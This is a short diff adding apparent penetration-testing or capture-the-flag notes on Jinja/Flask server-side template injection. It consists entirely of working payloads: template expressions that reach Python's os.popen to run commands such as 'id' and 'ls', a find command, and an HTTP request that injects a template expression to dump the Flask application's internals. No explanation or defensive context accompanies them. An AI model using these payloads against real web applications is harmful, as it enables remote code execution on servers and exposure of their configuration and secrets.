@@ -1,0 +1,9 @@
+PoC (jinja)
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Payload
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
+{{request.application.__globals__.__builtins__.__import__('os').popen('').read()}}
+Find file
+find . -name index
+
+GET /new/{{get_flashed_messages.__globals__.current_app.__dict__}} HTTP/1.1
